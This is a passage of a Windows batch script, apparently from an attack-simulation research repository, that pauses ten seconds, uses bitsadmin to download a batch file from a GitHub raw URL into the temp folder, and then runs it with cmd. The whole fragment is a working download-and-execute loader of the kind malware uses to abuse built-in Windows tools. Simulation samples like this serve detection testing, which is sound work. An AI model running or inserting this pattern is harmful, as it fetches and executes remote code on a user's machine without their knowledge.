...
timeout /t 10 /nobreak >nul
bitsadmin /transfer kjninjaDL /download /priority normal https://raw.githubusercontent.com/LearningKijo/ResearchDev/main/DEV/SimulationRepo/dev7.bat %temp%\dev7.bat
cmd /c "%Temp%\dev7.bat"
